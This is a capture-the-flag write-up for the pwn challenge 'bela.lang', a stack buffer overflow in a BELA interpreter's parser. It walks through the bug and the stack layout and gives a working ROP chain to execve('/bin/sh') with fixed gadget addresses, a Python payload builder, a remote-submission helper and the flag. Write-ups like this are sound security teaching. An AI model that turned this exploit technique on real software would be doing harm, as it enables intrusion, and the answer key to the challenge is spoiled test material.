# bela.lang

> Category: Pwn
> CTF: TRYHARDS
> Year: 2026

## Description
>We are given `belalang`, a statically linked, stripped, non-PIE x86-64 interpreter for a small language called BELA. Alongside the binary we get `patch.diff`, which adds integer-literal collection to `Parser::parseCallExpr` and copies those integers into a four-element `volatile int64_t` stack buffer with an unbounded `std::copy`. A call expression placed inside two nested blocks (`{{ ... }}`, where the parser's `depth == 2`) overflows the parser's stack frame with attacker-controlled 64-bit integers and reaches the saved return address. Because the binary is static and non-PIE, we ROP directly into `execve("/bin/sh", ...)` and read the flag.

---

## Initial Analysis

### Source Code / Binary

We are given `belalang.zip`, which contains:

```text
belalang                # the interpreter (81 MB)
patch.diff              # the intentionally introduced bug
brt/libbrt.a            # BELA runtime (print helpers, GC, stackmap)
brt/llvm_stackmaps.ld   # linker script for the runtime stackmap section
```

The binary is a 64-bit static ELF and it is stripped:

```bash
belalang: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped, for GNU/Linux 3.2.0
```

The CLI compiles and runs `.bel` sources:

```bash
$ ./belalang
belalang

Usage: belalang [OPTIONS] <COMMAND> <PATH>

Commands:
  build    Compile a .bel file
  run      Run a .bel file
  version  Print version information
  help     Print help message
```

### Protections

```text
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   Yes
```

Two facts decide the exploitation strategy:

- **No PIE** means every gadget and string address is fixed.
- **Static linking** means there is no libc base to leak, but also no ASLR-dependent libc address. A complete `execve` syscall chain can be built from gadgets already present in the binary.

### Vulnerability

The patch only touches `Parser::parseCallExpr` and `Parser::parseBlockExpr`. While parsing a call's arguments, it collects the integer literals:

```cpp
llvm::SmallVector<int64_t, 0> integerArgs;
...
if (depth >= 2 && arg->getKind() == Expr::ExprKind::IntLitExpr)
  integerArgs.push_back(static_cast<IntLitExpr *>(arg)->getValue());
```

Then, right before returning the `CallExpr`, it copies them into a fixed stack buffer:

```cpp
volatile int64_t integerScratch[4];
if (depth >= 2 && static_cast<size_t>(depth) < integerArgs.size() &&
    integerArgs.front() == depth)
  std::copy(integerArgs.begin() + depth, integerArgs.end(), integerScratch);
return call;
```

`integerScratch` holds four `int64_t` values (32 bytes). The guard only checks three things:

1. We are inside at least two nested blocks (`depth >= 2`).
2. There are more than `depth` integer arguments (`integerArgs.size() > depth`).
3. The first integer argument equals `depth` (`integerArgs.front() == depth`).

It never checks that `integerArgs.size() - depth <= 4`. `std::copy` is unbounded, so every extra integer literal is written past `integerScratch`, straight up the parser's stack frame. Each value is fully attacker-controlled and 64 bits wide.

`depth` is incremented for every `{ ... }` block inside `parseBlockExpr`:

```cpp
++depth;
...
--depth;
```

So `depth == 2` is reached by wrapping the call in two nested blocks.

#### Trigger

A source like `{{print(...)}}` gives `depth == 2` and a `print` call whose arguments are integer literals. The first argument must be `2` to satisfy `integerArgs.front() == depth`, and every integer after it is copied starting at `integerArgs.begin() + 2`.

With `depth == 2`, source argument `i` lands in scratch slot `k = i - 2`.

#### Stack layout

At the `std::copy` call site, the relevant part of `parseCallExpr`'s frame (rbp-relative, as observed in GDB) is:

| slot | offset | contents |
|-----:|-------:|----------|
| k=0  | -0xc0  | `integerScratch[0]` |
| k=4  | -0xa0  | `args` vector begin |
| k=5  | -0x98  | `args` vector size |
| k=6  | -0x90  | `integerArgs` vector begin |
| k=7  | -0x88  | `integerArgs` vector size |
| k=23 | -0x08  | saved `rbx` |
| k=24 |  0x00  | saved `rbp` |
| k=25 |  0x08  | return address |
| k=26+|  0x10+ | our ROP chain |

Two details matter for a clean exploit:

- Slots `k=4..7` overlap the two `SmallVector` objects (`args` and `integerArgs`). After the function returns, those vectors are destroyed. If their begin/size fields contain attacker garbage, the destructors try to free bogus pointers and abort before `ret`. Keeping `k=4..7 == 0` makes the vectors look empty, so destruction is a no-op.
- Slots `k=23`, `k=24`, and `k=25` overwrite saved `rbx`, saved `rbp`, and the saved return address. The first ROP gadget must therefore land at `k=25`.

## Solution

Since the binary is static and non-PIE, the exploit uses an `execve("/bin/sh", argv, NULL)` syscall chain and stages the command and `argv` array in writable memory first. The following addresses were verified against the binary:

| gadget / data | address |
|---|---|
| `pop rdi ; ret` | `0x4665c9` |
| `pop rsi ; ret` | `0x40f6e3` |
| `pop rdx ; ret` | `0x491a72` |
| `pop rax ; ret` | `0x635e12` |
| `syscall ; ret` | `0x4181682` |
| `mov qword ptr [rdi], rsi ; ret` | `0x14680f0` |
| `"/bin/sh"` | `0x42f3796` |
| writable `.bss` | `0x51ad000` |

`0x51ad000` is safe to write: the `GNU_RELRO` segment ends at `0x51aa000`, while the RW load segment extends past it, so this page remains writable at runtime.

A small helper appends a write-what-where gadget to the chain:

```python
def wq(chain, addr, val):
    chain += [POP_RDI, addr, POP_RSI, val & 0xFFFFFFFFFFFFFFFF, MOV_RDI_RSI]
```

The chain stages:

1. `"-c\0"` at `BSS`.
2. The command string at `BSS + 0x100`, eight bytes at a time.
3. `argv = ["/bin/sh", "-c", cmd, NULL]` at `BSS + 0x200`.
4. `execve("/bin/sh", argv, NULL)`.

The integer arguments are arranged so that the first gadget overwrites the return address. Each zero below covers one scratch/vector/saved-register slot:

```python
args = [DEPTH] + [0] * 26 + chain
```

`DEPTH = 2` satisfies the guard, the zeros cover the scratch buffer, both vector objects, saved `rbx`, and saved `rbp`, and `chain[0]` lands exactly on the saved return address.

## Exploit

The full solver is in [`solve.py`](solve.py). It generates the source, then either runs it locally through `./belalang build <file>` or sends it to the remote endpoint:

```python
def run_remote(src: str) -> str:
    req = urllib.request.Request(
        URL,
        data=json.dumps({"source": src}).encode(),
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=60) as resp:
        return resp.read().decode(errors="replace")
```

The core of the payload builder:

```python
chain = []

wq(chain, DASHC, u64(b"-c\x00\x00\x00\x00\x00\x00"))

blob = cmd + b"\x00"
for i in range(0, len(blob), 8):
    chunk = blob[i:i + 8].ljust(8, b"\x00")
    wq(chain, CMD + i, u64(chunk))

for i, val in enumerate([BINSH, DASHC, CMD, 0]):
    wq(chain, ARGV + i * 8, val)

chain += [
    POP_RDI, BINSH,
    POP_RSI, ARGV,
    POP_RDX, 0,
    POP_RAX, 59,
    SYSCALL,
]

args = [DEPTH] + [0] * 26 + chain
source = "{{print(" + ",".join(map(str, args)) + ")}}"
```

Running the solver against the remote endpoint spawns a shell with `-c <cmd>` and returns its output, which contains the flag.

## Flag

```text
TryHards{batta_ka_inago_ka_kirigirisu_ka_wakannai_yoooooo}
```

## Takeaways

- A guard that checks `size > n` but not `size - n <= buffer` is not a bound. `std::copy` will happily run past the end of the destination.
- `volatile` does not make a buffer safe; it only prevents the compiler from optimizing accesses away.
- Stack overflows in C++ frames must keep live locals sane. Here the `SmallVector` destructors abort on garbage pointers, so the overlapping vector fields have to be zeroed before `ret`.
- Static, non-PIE binaries are a gift: fixed gadget addresses and a fixed writable `.bss` allow a self-contained `execve` chain with no leaks.
